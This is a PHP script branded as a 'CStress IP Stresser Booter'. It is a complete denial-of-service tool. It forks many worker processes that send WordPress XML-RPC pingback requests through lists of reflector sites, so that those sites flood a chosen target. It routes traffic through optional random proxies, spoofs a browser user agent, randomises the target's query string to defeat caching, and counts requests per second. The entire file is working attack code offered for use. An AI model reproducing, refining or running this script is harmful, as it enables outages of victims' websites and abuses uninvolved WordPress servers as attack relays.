<?php
//Installation: yum install php-process php-xmlrpc php -y ; Written and made by CStress IP Stresser Booter
ini_set('memory_limit', '-1');
set_time_limit(0);
if (!isset($argv[4]))
{
echo "Usage: php ".$argv[0]." [target] [time] [list] [threads] [proxies (leave blank for none)] \r\n";
exit;
}
function partition($list, $p)
{
    $listlen   = count($list);
    $partlen   = floor($listlen / $p);
    $partrem   = $listlen % $p;
    $partition = array();
    $mark      = 0;
    for ($px = 0; $px < $p; $px++) {
        $incr           = ($px < $partrem) ? $partlen + 1 : $partlen;
        $partition[$px] = array_slice($list, $mark, $incr);
        $mark += $incr;
    }
    return $partition;
}
$part        = array();
$array       = file($argv[3], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if (isset($argv[5])) $proxies = file($argv[5], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$childcount  = $argv[4];
$part        = partition($array, $childcount);

$shm_id = shmop_open(23377332, "c", 0666, 1024);
shmop_close($shm_id);
for ($i = 0; $i < $childcount; $i++) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        echo "failed to fork on loop $i of forking\n";
        exit;
    } else if ($pid) {
        continue;
    } else {
        $sem    = sem_get(13377331, 1, 0666, 1);
        $shm_id = shmop_open(23377332, "c", 0666, 1024);
        while (true) {
            foreach ($part[$i] as $line) {
				$arr = explode(" ",$line);
                $ch         = curl_init();
				$proxy = '';
				if (isset($argv[5])) $proxy = $proxies[array_rand($proxies)];
                $curlConfig = array(
                    CURLOPT_URL => $arr[1],
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_HEADER => false,
                    CURLOPT_HTTPHEADER => array("Content-Type: text/xml"),
                    CURLOPT_POSTFIELDS => xmlrpc_encode_request("pingback.ping", array($argv[1].'?'.rand(1,1000).'='.rand(1,1000), $arr[0])),
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6',
                    CURLOPT_FOLLOWLOCATION => 1,
                    CURLOPT_PROXY => $proxy,
                    CURLOPT_TIMEOUT => 1
                );
                curl_setopt_array($ch, $curlConfig);
                curl_exec($ch);
                curl_close($ch);
                sem_acquire($sem);
                $number = shmop_read($shm_id, 0, 1024);
                $number = intval($number);
                $number++;
                shmop_write($shm_id, str_pad($number, 1024, "\0"), 0);
                sem_release($sem);
            }
        }
        die;
    }
}

$sem    = sem_get(13377331, 1, 0666, 1);
$shm_id = shmop_open(23377332, "c", 0666, 1024);
$total  = 0;
$time = 0;
while (true) {
    $time++;
    sem_acquire($sem);
    $number = shmop_read($shm_id, 0, 1024);
    $total += $number;
    echo $number . " R/s " . $total . " Total                              \r";
    shmop_write($shm_id, str_pad("0", 1024, "\0"), 0);
    sem_release($sem);
    sleep(1);
    if ($time > $argv[2]) {
        shell_exec('pkill -f "php ' . $argv[0] . ' ' . $argv[1] . ' ' . $argv[2] . ' ' . $argv[3] . ' ' . $argv[4] . '"');
        echo "Done\n";
    }
}

for ($j = 0; $j < $childcount; $j++) {
    $pid = pcntl_wait($status);
}

?>
